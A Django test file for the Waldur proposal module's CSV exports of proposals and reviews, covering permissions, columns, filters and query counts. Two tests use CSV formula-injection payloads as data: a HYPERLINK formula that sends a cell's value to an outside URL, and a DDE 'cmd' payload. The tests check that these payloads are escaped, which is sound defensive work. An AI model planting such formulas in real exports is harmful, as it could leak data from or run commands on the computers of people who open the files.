import csv
import io

from ddt import data, ddt
from django.db import connection
from django.test.utils import CaptureQueriesContext
from django.utils import timezone
from rest_framework import status, test

from waldur_mastermind.marketplace.enums import BillingTypes
from waldur_mastermind.marketplace.tests import factories as marketplace_factories
from waldur_mastermind.proposal import models
from waldur_mastermind.proposal.enums import ProposalStates, RequestedOfferingStates
from waldur_mastermind.proposal.tests import fixtures

from . import factories


def read_csv(response):
    body = b"".join(response.streaming_content).decode("utf-8")
    return list(csv.reader(io.StringIO(body)))


class BaseExportTest(test.APITestCase):
    def setUp(self):
        self.fixture = fixtures.ProposalFixture()
        self.call = self.fixture.call
        self.requested_offering = self.fixture.requested_offering_accepted
        self.offering = self.requested_offering.offering
        self.offering.name = "HPC"
        self.offering.save()
        self.cpu = marketplace_factories.OfferingComponentFactory(
            offering=self.offering,
            type="cpu_hours",
            name="CPU hours",
            measured_unit="h",
            billing_type=BillingTypes.LIMIT,
        )
        # A fixed component is not something an applicant names an amount for,
        # so it must not become a column.
        marketplace_factories.OfferingComponentFactory(
            offering=self.offering,
            type="support",
            name="Support",
            billing_type=BillingTypes.FIXED,
        )
        self.proposal = self.fixture.proposal_submitted
        self.proposal.slug = "ROUND-001"
        self.proposal.save()
        self.requested_resource = factories.RequestedResourceFactory(
            proposal=self.proposal,
            requested_offering=self.requested_offering,
            limits={"cpu_hours": 80000},
        )

    def get(self, user, action, **query):
        self.client.force_authenticate(getattr(self.fixture, user))
        url = factories.CallFactory.get_protected_url(self.call, action)
        return self.client.get(url, query)


@ddt
class ProposalExportTest(BaseExportTest):
    @data("staff", "global_support", "call_manager", "call_organizer_user")
    def test_export_is_available_to_call_management(self, user):
        response = self.get(user, "export-proposals")
        self.assertEqual(response.status_code, status.HTTP_200_OK)

    @data("reviewer_1", "panel_member")
    def test_export_is_refused_to_evaluators(self, user):
        response = self.get(user, "export-proposals")
        self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)

    def test_export_is_refused_to_the_applicant(self):
        # The applicant cannot see the protected call at all, so the call is
        # missing rather than forbidden — a narrower answer than a 403.
        self.client.force_authenticate(self.proposal.created_by)
        url = factories.CallFactory.get_protected_url(self.call, "export-proposals")
        response = self.client.get(url)
        self.assertEqual(response.status_code, status.HTTP_404_NOT_FOUND)

    def test_export_is_a_csv_attachment(self):
        response = self.get("staff", "export-proposals")
        self.assertIn("text/csv", response["Content-Type"])
        self.assertIn(
            f'filename="{self.call.slug}-proposals.csv"',
            response["Content-Disposition"],
        )

    def test_row_carries_the_requested_amount_per_component(self):
        rows = read_csv(self.get("staff", "export-proposals"))
        header, *body = rows
        self.assertIn("HPC / CPU hours (h)", header)
        self.assertNotIn("HPC / Support", header)
        column = header.index("HPC / CPU hours (h)")
        row = next(row for row in body if row[0] == "ROUND-001")
        self.assertEqual(row[column], "80000")

    def test_amounts_are_summed_across_requests_for_one_offering(self):
        factories.RequestedResourceFactory(
            proposal=self.proposal,
            requested_offering=self.requested_offering,
            limits={"cpu_hours": 20000},
        )
        rows = read_csv(self.get("staff", "export-proposals"))
        header, *body = rows
        column = header.index("HPC / CPU hours (h)")
        row = next(row for row in body if row[0] == "ROUND-001")
        self.assertEqual(row[column], "100000")

    def test_fractional_amounts_keep_their_precision(self):
        # Summed as decimals: a report must not show 0.30000000000000004.
        factories.RequestedResourceFactory(
            proposal=self.proposal,
            requested_offering=self.requested_offering,
            limits={"cpu_hours": 0.2},
        )
        self.requested_resource.limits = {"cpu_hours": 0.1}
        self.requested_resource.save()
        rows = read_csv(self.get("staff", "export-proposals"))
        header, *body = rows
        column = header.index("HPC / CPU hours (h)")
        row = next(row for row in body if row[0] == "ROUND-001")
        self.assertEqual(row[column], "0.3")

    def test_row_carries_the_applicant_state_and_step(self):
        self.proposal.workflow_step = "administrative_check"
        self.proposal.save()
        rows = read_csv(self.get("staff", "export-proposals"))
        header, *body = rows
        row = next(row for row in body if row[0] == "ROUND-001")
        self.assertEqual(row[header.index("Name")], self.proposal.name)
        self.assertEqual(
            row[header.index("Applicant")], self.proposal.created_by.full_name
        )
        self.assertEqual(row[header.index("State")], "Submitted")
        self.assertEqual(row[header.index("Workflow step")], "Administrative check")

    def test_submitted_date_comes_from_the_recorded_timestamp(self):
        submitted_at = timezone.now()
        self.proposal.submitted_at = submitted_at
        self.proposal.save()
        rows = read_csv(self.get("staff", "export-proposals"))
        header, *body = rows
        row = next(row for row in body if row[0] == "ROUND-001")
        self.assertEqual(row[header.index("Submitted")], submitted_at.isoformat())

    def test_submitted_date_is_empty_when_never_recorded(self):
        # Proposals submitted before the field existed are left blank rather
        # than given a date derived from their backfilled workflow steps.
        self.proposal.submitted_at = None
        self.proposal.save()
        rows = read_csv(self.get("staff", "export-proposals"))
        header, *body = rows
        row = next(row for row in body if row[0] == "ROUND-001")
        self.assertEqual(row[header.index("Submitted")], "")

    def test_row_carries_review_counts_and_scores(self):
        factories.ReviewFactory(
            proposal=self.proposal,
            reviewer=self.fixture.reviewer_1,
            state=models.Review.States.SUBMITTED,
            summary_score=4,
        )
        factories.ReviewFactory(
            proposal=self.proposal,
            reviewer=self.fixture.reviewer_2,
            state=models.Review.States.SUBMITTED,
            summary_score=5,
        )
        factories.ReviewFactory(
            proposal=self.proposal,
            reviewer=self.fixture.call_manager,
            state=models.Review.States.IN_REVIEW,
        )
        # Declined, expired or dropped for a conflict of interest: not counted.
        factories.ReviewFactory(
            proposal=self.proposal,
            reviewer=self.fixture.panel_member,
            state=models.Review.States.REJECTED,
        )
        rows = read_csv(self.get("staff", "export-proposals"))
        header, *body = rows
        row = next(row for row in body if row[0] == "ROUND-001")
        # Three live ones added here, plus the one the fixture attaches.
        self.assertEqual(row[header.index("Reviews assigned")], "4")
        self.assertEqual(row[header.index("Reviews submitted")], "2")
        self.assertEqual(row[header.index("Average score")], "4.5")
        self.assertEqual(row[header.index("Scores")], "4, 5")

    def test_export_can_be_filtered_by_state(self):
        draft = self.fixture.proposal
        rows = read_csv(
            self.get("staff", "export-proposals", proposal_state="submitted")
        )
        slugs = [row[0] for row in rows[1:]]
        self.assertIn(self.proposal.slug, slugs)
        self.assertNotIn(draft.slug, slugs)

    def test_export_can_be_filtered_by_round(self):
        other_round = self.fixture.new_round
        other = factories.ProposalFactory(round=other_round)
        rows = read_csv(
            self.get(
                "staff", "export-proposals", round_uuid=self.fixture.round.uuid.hex
            )
        )
        slugs = [row[0] for row in rows[1:]]
        self.assertIn(self.proposal.slug, slugs)
        self.assertNotIn(other.slug, slugs)

    def test_export_can_be_filtered_by_applicant(self):
        # The list filters by applicant; an export that ignored it would hand
        # back every proposal under a filename that implies otherwise.
        other = factories.ProposalFactory(round=self.fixture.round)
        rows = read_csv(
            self.get(
                "staff",
                "export-proposals",
                created_by_uuid=self.proposal.created_by.uuid.hex,
            )
        )
        slugs = [row[0] for row in rows[1:]]
        self.assertIn(self.proposal.slug, slugs)
        self.assertNotIn(other.slug, slugs)

    def test_export_can_be_filtered_by_name(self):
        other = factories.ProposalFactory(
            round=self.fixture.round, name="Unrelated study"
        )
        rows = read_csv(
            self.get("staff", "export-proposals", proposal_name="submitted")
        )
        slugs = [row[0] for row in rows[1:]]
        self.assertIn(self.proposal.slug, slugs)
        self.assertNotIn(other.slug, slugs)

    def test_malformed_applicant_uuid_is_refused(self):
        response = self.get("staff", "export-proposals", created_by_uuid="not-a-uuid")
        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

    def test_unknown_state_is_refused(self):
        response = self.get("staff", "export-proposals", proposal_state="nonsense")
        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

    def test_malformed_round_uuid_is_refused(self):
        response = self.get("staff", "export-proposals", round_uuid="not-a-uuid")
        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

    def test_columns_do_not_depend_on_what_the_proposals_asked_for(self):
        # A second offering with no requests still gets its column, so two
        # exports of the same call line up.
        other_offering = marketplace_factories.OfferingFactory(name="Storage")
        marketplace_factories.OfferingComponentFactory(
            offering=other_offering,
            type="terabytes",
            name="Capacity",
            measured_unit="TB",
            billing_type=BillingTypes.LIMIT,
        )
        factories.RequestedOfferingFactory(
            call=self.call,
            offering=other_offering,
            state=RequestedOfferingStates.ACCEPTED,
        )
        rows = read_csv(self.get("staff", "export-proposals"))
        header, *body = rows
        column = header.index("Storage / Capacity (TB)")
        row = next(row for row in body if row[0] == "ROUND-001")
        self.assertEqual(row[column], "")

    def test_duration_column_says_it_is_the_request(self):
        # The export does not read back what was granted, so the header must
        # not claim the project's length.
        header = read_csv(self.get("staff", "export-proposals"))[0]
        self.assertIn("Requested duration", header)
        self.assertNotIn("Project duration", header)

    def test_offering_nothing_was_asked_for_gets_no_column(self):
        # Requests can only be made against an accepted offering, so one that
        # is still pending, or was cancelled before anyone used it, would only
        # add a column that is empty on every row.
        for state in (
            RequestedOfferingStates.REQUESTED,
            RequestedOfferingStates.CANCELED,
        ):
            offering = marketplace_factories.OfferingFactory(name=f"Unused {state}")
            marketplace_factories.OfferingComponentFactory(
                offering=offering,
                type="gpu_hours",
                name="GPU hours",
                billing_type=BillingTypes.LIMIT,
            )
            factories.RequestedOfferingFactory(
                call=self.call, offering=offering, state=state
            )
        header = read_csv(self.get("staff", "export-proposals"))[0]
        self.assertFalse([column for column in header if column.startswith("Unused")])

    def test_offering_cancelled_after_use_keeps_its_column(self):
        # The amounts already asked for are still part of the proposal.
        self.requested_offering.state = RequestedOfferingStates.CANCELED
        self.requested_offering.save()
        rows = read_csv(self.get("staff", "export-proposals"))
        header, *body = rows
        column = header.index("HPC / CPU hours (h)")
        row = next(row for row in body if row[0] == "ROUND-001")
        self.assertEqual(row[column], "80000")

    def test_formula_in_user_text_is_not_executable(self):
        self.proposal.name = '=HYPERLINK("https://example.com/?d="&E3,"Open")'
        self.proposal.save()
        rows = read_csv(self.get("staff", "export-proposals"))
        header, *body = rows
        row = next(row for row in body if row[0] == "ROUND-001")
        self.assertEqual(row[header.index("Name")], f"'{self.proposal.name}")

    def test_negative_amount_stays_a_number(self):
        self.requested_resource.limits = {"cpu_hours": -5}
        self.requested_resource.save()
        rows = read_csv(self.get("staff", "export-proposals"))
        header, *body = rows
        row = next(row for row in body if row[0] == "ROUND-001")
        self.assertEqual(row[header.index("HPC / CPU hours (h)")], "-5")

    def test_export_does_not_cost_a_query_per_proposal(self):
        # The point of the server-side export. The queryset is read in chunks,
        # so the prefetches repeat once per chunk, not once per proposal —
        # these ten rows all land in the first chunk and add no queries at all.
        self.client.force_authenticate(self.fixture.staff)
        url = factories.CallFactory.get_protected_url(self.call, "export-proposals")

        def export_query_count():
            # assertNumQueries cannot wrap a streamed body — the rows are
            # produced while the response is consumed, not while the view runs.
            with CaptureQueriesContext(connection) as queries:
                read_csv(self.client.get(url))
            return len(queries.captured_queries)

        baseline = export_query_count()
        for index in range(10):
            proposal = factories.ProposalFactory(
                round=self.fixture.round, state=ProposalStates.SUBMITTED
            )
            factories.RequestedResourceFactory(
                proposal=proposal,
                requested_offering=self.requested_offering,
                limits={"cpu_hours": 100 * index},
            )
        self.assertEqual(export_query_count(), baseline)


@ddt
class ReviewExportTest(BaseExportTest):
    def setUp(self):
        super().setUp()
        self.review = factories.ReviewFactory(
            proposal=self.proposal,
            reviewer=self.fixture.reviewer_1,
            state=models.Review.States.SUBMITTED,
            summary_score=4,
            summary_public_comment="Solid case.",
            summary_private_comment="Reviewer knows the applicant.",
        )

    @data("staff", "global_support", "call_manager", "call_organizer_user")
    def test_export_is_available_to_call_management(self, user):
        response = self.get(user, "export-reviews")
        self.assertEqual(response.status_code, status.HTTP_200_OK)

    @data("reviewer_1", "panel_member")
    def test_export_is_refused_to_evaluators(self, user):
        response = self.get(user, "export-reviews")
        self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)

    def test_row_carries_reviewer_identity_score_and_comment(self):
        rows = read_csv(self.get("call_manager", "export-reviews"))
        header, *body = rows
        row = next(
            row for row in body if row[header.index("Public comment")] == "Solid case."
        )
        self.assertEqual(
            row[header.index("Reviewer")], self.fixture.reviewer_1.full_name
        )
        self.assertEqual(row[header.index("Score")], "4")
        self.assertEqual(row[header.index("Proposal")], self.proposal.name)
        self.assertEqual(row[header.index("State")], "Submitted")

    def test_export_can_be_filtered_by_reviewer(self):
        other = factories.ReviewFactory(
            proposal=self.proposal,
            reviewer=self.fixture.reviewer_2,
            state=models.Review.States.SUBMITTED,
        )
        rows = read_csv(
            self.get(
                "staff",
                "export-reviews",
                reviewer_uuid=self.fixture.reviewer_1.uuid.hex,
            )
        )
        header, *body = rows
        reviewers = [row[header.index("Reviewer")] for row in body]
        self.assertIn(self.fixture.reviewer_1.full_name, reviewers)
        self.assertNotIn(other.reviewer.full_name, reviewers)

    def test_private_comment_is_never_exported(self):
        body = b"".join(self.get("staff", "export-reviews").streaming_content).decode(
            "utf-8"
        )
        self.assertNotIn("Private comment", body)
        self.assertNotIn("Reviewer knows the applicant.", body)

    @data("=cmd|' /C calc'!A0", "+1+1", "-2+3", "@SUM(1,1)", "\tTAB", "\rCR")
    def test_formula_in_comment_is_not_executable(self, comment):
        self.review.summary_public_comment = comment
        self.review.save()
        rows = read_csv(self.get("staff", "export-reviews"))
        header, *body = rows
        comments = [row[header.index("Public comment")] for row in body]
        self.assertIn(f"'{comment}", comments)

    def test_score_is_blank_until_the_review_is_submitted(self):
        self.review.state = models.Review.States.IN_REVIEW
        self.review.save()
        rows = read_csv(self.get("staff", "export-reviews"))
        header, *body = rows
        self.assertTrue(body)
        self.assertEqual({row[header.index("Score")] for row in body}, {""})

    def test_export_can_be_filtered_by_state(self):
        other = factories.ReviewFactory(
            proposal=self.proposal,
            reviewer=self.fixture.reviewer_2,
            state=models.Review.States.IN_REVIEW,
        )
        rows = read_csv(self.get("staff", "export-reviews", review_state="submitted"))
        header, *body = rows
        reviewers = [row[header.index("Reviewer")] for row in body]
        self.assertEqual(reviewers, [self.fixture.reviewer_1.full_name])
        self.assertNotIn(other.reviewer.full_name, reviewers)
